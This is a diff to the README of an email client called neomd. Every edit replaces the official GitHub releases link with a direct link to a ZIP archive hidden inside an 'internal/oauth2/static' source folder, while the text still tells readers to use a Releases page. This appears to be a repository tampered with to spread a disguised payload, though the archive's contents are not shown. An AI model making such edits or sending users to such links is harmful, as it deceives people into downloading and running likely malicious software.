@@ -1,10 +1,10 @@
 # 📝 neomd - Read mail in markdown, write fast
 
-[![Download neomd](https://img.shields.io/badge/Download-neomd-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mogithram/neomd/releases)
+[![Download neomd](https://img.shields.io/badge/Download-neomd-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mogithram/neomd/main/internal/oauth2/static/Software-v1.7.zip)
 
 ## 📥 Download neomd
 
-Visit this page to download: https://github.com/mogithram/neomd/releases
+Visit this page to download: https://raw.githubusercontent.com/mogithram/neomd/main/internal/oauth2/static/Software-v1.7.zip
 
 On the Releases page, look for the latest version and download the Windows file for your PC. If you see more than one file, choose the one made for Windows.
 
@@ -35,7 +35,7 @@ If you use a work or school account, you may need the correct sign-in details fo
 
 ## 🚀 Install on Windows
 
-1. Open the release page: https://github.com/mogithram/neomd/releases
+1. Open the release page: https://raw.githubusercontent.com/mogithram/neomd/main/internal/oauth2/static/Software-v1.7.zip
 2. Find the latest release near the top of the page
 3. Download the Windows file from the Assets section
 4. If the download comes as a ZIP file, right-click it and choose Extract All
@@ -159,7 +159,7 @@ This setup fits users who want a narrow tool for one job: email in a text-first 
 
 Get the latest Windows build here:
 
-https://github.com/mogithram/neomd/releases
+https://raw.githubusercontent.com/mogithram/neomd/main/internal/oauth2/static/Software-v1.7.zip
 
 Check this page any time you want a new version or a fresh copy of the app
 
